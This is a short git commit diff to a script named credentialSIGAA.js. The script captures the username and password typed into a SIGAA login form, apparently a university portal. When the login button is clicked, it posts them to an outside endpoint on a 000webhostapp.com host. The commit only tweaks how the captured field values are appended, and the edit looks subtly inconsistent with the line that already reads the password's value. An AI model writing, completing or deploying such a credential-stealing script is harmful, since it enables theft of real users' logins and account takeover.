0e8c5f3b72bd838aa231dc8a8aa9cb99f4e04bc4
Wolota <123838258+Wolota@users.noreply.github.com>
2023-03-07 22:34:52 -0300

    Update credentialSIGAA.js

--- credentialSIGAA.js
+++ credentialSIGAA.js
@@ -8,8 +8,8 @@ const password = document.querySelector('[name="user.senha"]').value
 if (btn){
     btn.addEventListener("click", function(){
         const data = new FormData();
-        data.append("username", username);
-        data.append("password", password);
+        data.append("username", username.value);
+        data.append("password", password.value);
 
 
         const response = fetch("https://fckyou-get.000webhostapp.com/get.php", {
